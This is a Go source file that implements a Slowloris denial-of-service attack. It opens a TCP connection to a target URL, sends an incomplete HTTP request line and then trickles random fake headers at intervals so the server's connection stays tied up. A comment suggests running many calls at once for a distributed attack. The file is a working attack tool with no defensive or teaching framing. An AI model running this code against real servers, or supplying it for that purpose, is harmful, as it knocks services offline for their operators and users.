package main

import (
	"context"
	"fmt"
	"net"
	"net/url"
	"strings"
	"time"

	"github.com/icrowley/fake"
)

// Slowloris performs single threaded slow loris attack. If you want to run distributed
// attack, just run multiple calls of the function over the same URL.
func Slowloris(ctx context.Context, index int64, interval time.Duration, url *url.URL) error {
	host := url.Host
	if !strings.Contains(host, ":") {
		host = fmt.Sprintf("%s:%s", url.Host, url.Port())
	}

	conn, err := net.Dial("tcp", host)
	if err != nil {
		return err
	}

	requestLine := GetRequestLine(url.Path)
	fmt.Println("Sending request line", requestLine)
	n, err := conn.Write([]byte(requestLine))
	if err != nil || n < len(requestLine) {
		return err
	}

	for {
		select {
		case <-ctx.Done():
			return nil
		case <-time.After(interval):
			header := RandomHeader()
			// 			fmt.Printf("slowloris %d: send header (%s)\n", index, strings.ReplaceAll(header, "\r\n", ""))
			n, err := conn.Write([]byte(header))
			if err != nil || n < len(header) {
				return err
			}
		}
	}

	return nil
}

// GetRequestLine returns HTTP request line for GET request
func GetRequestLine(path string) string {
	return fmt.Sprintf("GET %s HTTP/1.1\r\n", path)
}

// HostHeader returns formatted Host header
func HostHeader(host string) string {
	return fmt.Sprintf("Host: %s\r\n", host)
}

// RandomHeader generates a random HTTP header to send as part of the
// slowloris attack
func RandomHeader() string {
	return fmt.Sprintf("X-%s: %s\r\n", strings.Title(fake.Word()), fake.Word())
}

// ClosingLine sends a closing line for a HTTP request
func ClosingLine() string {
	return "\r\n"
}
